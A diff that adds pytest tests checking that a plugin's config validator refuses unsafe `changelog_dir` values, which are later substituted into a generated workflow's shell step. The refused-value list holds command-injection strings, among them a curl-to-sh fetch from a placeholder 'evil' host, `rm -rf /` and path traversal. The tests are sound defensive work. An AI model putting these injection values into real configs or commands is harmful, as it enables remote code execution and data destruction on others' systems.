@@ -43,6 +43,61 @@ def test_a_complete_config_validates():
     assert oss_config.validate(_valid()) == []
 
 
+# `changelog_dir` is the one configured value that becomes shell source in a file this
+# plugin writes into somebody else's repository: the generated workflow substitutes it
+# into a `run:` body. It was the only key `validate()` did not look at, so a value
+# carrying a command substitution passed with zero problems reported (#31).
+
+REFUSED_CHANGELOG_DIRS = [
+    "news.d$(curl -s http://evil/x|sh)",
+    "news.d`id`",
+    "news.d; rm -rf /",
+    "news.d && curl evil",
+    "news.d | sh",
+    "$HOME/news.d",
+    "/etc/news.d",
+    "../outside",
+    "news.d/../..",
+    "news .d",
+    "news.d/",
+    "",
+    123,
+    ["changelog.d"],
+    {"dir": "changelog.d"},
+]
+
+
+@pytest.mark.parametrize("value", REFUSED_CHANGELOG_DIRS, ids=lambda v: repr(v)[:40])
+def test_a_changelog_dir_that_is_not_a_plain_relative_path_is_refused(value):
+    config = _valid()
+    config["changelog_dir"] = value
+    problems = oss_config.validate(config)
+    assert problems, "changelog_dir={!r} validated with no problems".format(value)
+    assert any("changelog_dir" in problem for problem in problems), problems
+
+
+# Nested is not exotic and must keep working: `_write` creates parent directories and
+# the scaffold plans `docs/changelog.d/README.md` happily. A check tight enough to
+# forbid it would refuse a legitimate repo to close a hole quoting already closes.
+ACCEPTED_CHANGELOG_DIRS = ["changelog.d", "news.d", "docs/changelog.d", "doc/news/fragments", None]
+
+
+@pytest.mark.parametrize("value", ACCEPTED_CHANGELOG_DIRS, ids=lambda v: repr(v)[:40])
+def test_an_ordinary_relative_changelog_directory_is_accepted(value):
+    config = _valid()
+    config["changelog_dir"] = value
+    assert oss_config.validate(config) == []
+
+
+def test_the_refusal_names_the_key_and_says_what_was_expected():
+    config = _valid()
+    config["changelog_dir"] = "news.d$(id)"
+    problems = oss_config.validate(config)
+    assert len(problems) == 1, problems
+    assert "changelog_dir" in problems[0]
+    assert "news.d$(id)" in problems[0]
+
+
 @pytest.mark.parametrize("key", sorted(_valid()))
 def test_every_required_key_is_required(key):
     """A missing key must be named, not defaulted. A default here is a fact about
